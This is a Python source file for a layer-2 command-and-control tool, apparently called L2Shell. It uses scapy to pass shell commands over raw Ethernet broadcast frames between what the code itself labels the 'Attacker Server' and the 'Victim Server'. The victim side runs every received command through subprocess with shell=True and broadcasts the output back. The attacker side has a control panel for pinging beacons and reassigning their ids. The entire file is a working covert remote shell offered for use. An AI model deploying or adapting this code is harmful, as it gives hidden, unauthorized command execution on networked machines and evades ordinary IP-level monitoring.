import argparse, threading, time
import hashlib
from scapy.all import sniff, Ether, sendp
import subprocess, os

mac_address = "FF:FF:FF:FF:FF:FF" # default return address is broadcast
frame_size  = 1000 # Default frame size is 1500, but if jumbo frames are supported on the network
                   # this can be changed as required.
                  
frame_delay = 0.5      # For chunked responses, could help by spacing out frames
session_id  = "123456" # Id for accessing the session
attacker_id = "zxczxc" # Id for returning information to the attacker server

# Create a hash for session_id change
session_id_change = hashlib.sha3_256()
session_id_change.update(b"SessionChangeRequest")
session_id_change = session_id_change.hexdigest()

# Create a hash for attacker_id change
attacker_id_change = hashlib.sha3_256()
attacker_id_change.update(b"AttackerChangeRequest")
attacker_id_change = attacker_id_change.hexdigest()

# Create hash of global ID (Only for broadcast events)
global_id = hashlib.sha3_256()
global_id.update(b"GlobalIdentifier") 
global_id = global_id.hexdigest()

# Create a hash for C2L2 server
c2_id = hashlib.sha3_256()
c2_id.update(b"Unique_C2_Id_Should_Be_Used")
c2_id = c2_id.hexdigest()

# Create hash of hash
c2_id_r = hashlib.sha3_256()
c2_id_r.update(c2_id.encode('utf-8'))
c2_id_r = c2_id_r.hexdigest()
                 
def send_frame(message, mac_address, sender):
    # Next send the output back to the command server
    frames = [message[i:i+frame_size] for i in range(0, len(message), frame_size)]
    for frame in frames:
        time.sleep(frame_delay)
        frame = sender + frame.decode('utf-8') # Make sure to add the attacker id
        eth_frame = Ether(dst=mac_address) / frame
        
        # Send the Ethernet frame
        with open(os.devnull, 'w') as f:
            sendp(eth_frame, verbose=False)
            
def Delimiter(index, message, delimiter): # delimits received message
    pad     = "\\x00"   # Gets rid of padding
    returnc = "\\r"     # Gets rid of return carriage 
    
    string = str(message)
    nstring = string[index + len(delimiter):]
    nstring = nstring.replace(returnc, '')
    nstring = nstring.replace(pad, '')
    nstring = nstring.replace("'", "")    
    return nstring

# Setter for session_id            
def ChangeSessionID(userin):
    global session_id
    session_id = userin
    
# Setter for attacker_id            
def ChangeAttackerID(userin):
    global attacker_id
    attacker_id = userin

# Define a callback function to handle each frame
def process_frame(frame):
    global session_id
    if Ether in frame:
        eth_frame = frame[Ether]
        
        if len(eth_frame.payload) > 0:
                
            index = str(eth_frame.payload.original).find(session_id) # receive command from C2    
            if c2_id.encode("utf-8") in eth_frame.payload.original: # Respond to c2 ping
                # Send frame of hashed c2_id and session_id
                print("pong")
                pong = c2_id_r + session_id
                #print(pong)
                send_frame(pong.encode('utf-8'), "FF:FF:FF:FF:FF:FF", attacker_id)
                index = -1

            if session_id_change.encode('utf-8') in eth_frame.payload.original and index != -1: # Respond to session change request
                # First, find index
                sid_index = str(eth_frame.payload.original).find(session_id_change)  
                string = Delimiter(sid_index, str(eth_frame.payload.original), session_id_change) 
                print("changing sid to: " + string)
                ChangeSessionID(string)
                index = -1
                
            if attacker_id_change.encode('utf-8') in eth_frame.payload.original and index != -1: # Respond to attacker change request
                # First, find index
                att_index = str(eth_frame.payload.original).find(attacker_id_change)  
                string = Delimiter(att_index, str(eth_frame.payload.original), attacker_id_change) 
                print("changing attid to: " + string)
                ChangeAttackerID(string)
                index = -1
                
            if attacker_id_change.encode('utf-8') in eth_frame.payload.original and global_id.encode('utf-8') in eth_frame.payload.original: # Respond global attacker change request
                # First, find index
                att_index = str(eth_frame.payload.original).find(attacker_id_change)  
                string = Delimiter(att_index, str(eth_frame.payload.original), attacker_id_change) 
                print("changing attid to: " + string)
                ChangeAttackerID(string)
                index = -1
             
            if index != -1:
                print("Source MAC:", eth_frame.src)
                print("Destination MAC:", eth_frame.dst)
                print("Payload Length:", len(eth_frame.payload))
                
                # This section needs to be delimited twice, not elegant but will have to do for a bit
                nstring = Delimiter(index,str(eth_frame.payload.original),session_id)
                index2 = nstring.find(session_id)
                nstring = Delimiter(index2,nstring,session_id)
                try:
                    output = subprocess.check_output(nstring.strip("'"), shell=True)
                    print(output.decode("utf-8"))
                    noutput = attacker_id + output.decode("utf-8")
                
                except Exception as e:
                    output = "Error: Invalid Command"
                    noutput = attacker_id + output
                    
                # Next send the output back to the command server
                send_frame(noutput.encode('utf-8'), "FF:FF:FF:FF:FF:FF", attacker_id)


# This method is the listening server for the attacker host.
def process_return_frame(frame):
    if Ether in frame:
        eth_frame = frame[Ether]
        if eth_frame.dst=="ff:ff:ff:ff:ff:ff": # This needs to be changed or kept default
            
            if len(eth_frame.payload) > 0:
                
                pong_index = str(eth_frame.payload.original).find(c2_id_r)
                index = str(eth_frame.payload.original).find(attacker_id)
                if pong_index != -1:
                    
                    string = Delimiter(pong_index, str(eth_frame.payload.original), c2_id_r) 
                    print("Beacon: " + "mac:[" + eth_frame.src + "]" + " sid:[" + string + "]")
                    index = -1
                
                if index != -1:
                    # This section needs to be delimited twice, not elegant but will have to do for a bit
                    string = Delimiter(index, str(eth_frame.payload.original), attacker_id)
                    index2 = string.find(attacker_id)
                    string = Delimiter(index2, string, attacker_id)
                    terminal_format = string.split('\\n')
                    
                    #print(terminal_format)
                    for line in terminal_format:
                        print(line)
                    
                    print("" + session_id + ">", end='')
                    
                    
def ControlPanel(userin):
    global session_id
    global attacker_id
    
    if "enable options" in userin:
        
        while userin != "disable options" or userin != "3":
            print("L2C2 Control Panel: \n")
            print("1) ping beacons")
            print("2) connect to beacon")
            print("3) change attacker id")
            print("4) change beacon session id")
            print("5) change beacon attacker id")
            print("6) change attacker id for broadcast domain")
            print("7) help")
            print("8) disable options")
            print(">", end='')
            userin = input()
            
            if userin == "1":
                print("Pinging Beacons: \n")
                send_frame(c2_id.encode('utf-8'), "FF:FF:FF:FF:FF:FF", "")
                time.sleep(3) # Wait some time for beacons to call home
                
            elif userin == "2":
                session_id = input("Session ID: ")
                print("Session ID is changed to " + session_id)
                
            elif userin == "3":
                session_id = input("Attacker ID: ")
                print("Attacker ID is changed to " + attacker_id)
                
            elif userin == "4":
                print("Current beacon [" + session_id + "]:")
                userin = input("Change session id? (y/n) ")
                if userin == "y":
                    userin = input("New Session ID: ")
                    # Send request to beacon
                    changesidreq = session_id_change + userin
                    send_frame(changesidreq.encode('utf-8'), "FF:FF:FF:FF:FF:FF", session_id)
                    session_id = userin
                    print("Session ID is changed to " + session_id)
                    
            elif userin == "5":
                print("Current beacon [" + session_id + "]:")
                userin = input("Change attacker id? (y/n) ")
                if userin == "y":
                    userin = input("New attacker ID: ")
                    # Send request to beacon
                    changeattidreq = attacker_id_change + userin
                    send_frame(changeattidreq.encode('utf-8'), "FF:FF:FF:FF:FF:FF", session_id)
                    attacker_id = userin
                    print("Attacker ID is changed to " + attacker_id)
            
            elif userin == "6":
                userin = input("Are you sure you want to issue a global attacker id change? (y/n) ")
                if userin == "y":
                    userin = input("New attacker ID: ")
                    # Send request to beacon
                    changeattidreq = attacker_id_change + userin
                    send_frame(changeattidreq.encode('utf-8'), "FF:FF:FF:FF:FF:FF", global_id)
                    attacker_id = userin
                    print("Attacker ID is changed to " + attacker_id)
                
            elif userin == "7":
                print("Select one of the options to configure a beacon, or exit by entering 'disable options'\n")
            
            elif userin == "8":
                userin = "disable options"
                print()
                break
                
            userin = ""

# Sniff Ethernet frames and call the process_packet function for each packet
def listen():
    print("In listen mode: ")
    sniff(prn=process_frame, store=0)
    
def rlisten():
    sniff(prn=process_return_frame, store=0)

# The connect feature can be used to send commands, but also receive info from
# remote computers
def connect():
    # Create an Ethernet frame with custom payload (padding)
    #for test in range(5):
    print("In connect mode: ")
    
    listener_thread = threading.Thread(target=rlisten)
    listener_thread.daemon = True
    listener_thread.start()
    
    userin = ""
    while userin != "x":
        userin += session_id 
        userin += str(input())
                 
        # Make sure the input isn't larger than the set amount
        
        if len(userin) > frame_size:
            print("Error: Input too large...")
        
        ControlPanel(userin)      
        
        if userin != session_id and "enable options" not in userin:
            send_frame(userin.encode('utf-8'), mac_address, session_id)
            
        else:
            print("" + session_id + ">", end='')
        
        userin = ''
    exit(0)
    
def main():

    global mac_address
    global session_id
    global attacker_id
    global frame_size
    global frame_delay
    epilog="""
    e.g. python3 L2Shell.py -l -a 1a1a1a -s 3f3f3f <-- Victim Server
    e.g. python3 L2Shell.py -c -a 1a1a1a -s 3f3f3f <-- Attacker Server       
    """
   
    parser = argparse.ArgumentParser(usage=epilog)
    
    parser.add_argument("-l", "--listen", action='store_true', help="Listen for connections")
    parser.add_argument("-c", "--connect", action='store_true', help="Connect and instruct commands")
    parser.add_argument("-m", "--mac", help="beacon mac address", type=str)
    parser.add_argument("-s", "--session", help="session id", type=str, required=True)
    parser.add_argument("-a", "--attacker", help="attacker id", type=str, required=True)
    parser.add_argument("-d", "--delay", help="frame delay for chunked responses", type=int)
    parser.add_argument("-f", "--framesize", help="Sets frame size (victim host)", type=int)
    
    
    args = parser.parse_args()

    if args.mac:
        mac_address = args.mac
        
    if args.delay:
        frame_delay = args.delay    
        
    if args.attacker:
        attacker_id = args.attacker
    
    if args.framesize:
        frame_size = args.framesize
    
    if args.session:
        session_id = args.session
    
    if args.listen:
        listen()
        
    if args.connect:
        connect()
        
    #if args.check

if __name__ == "__main__":
    main()
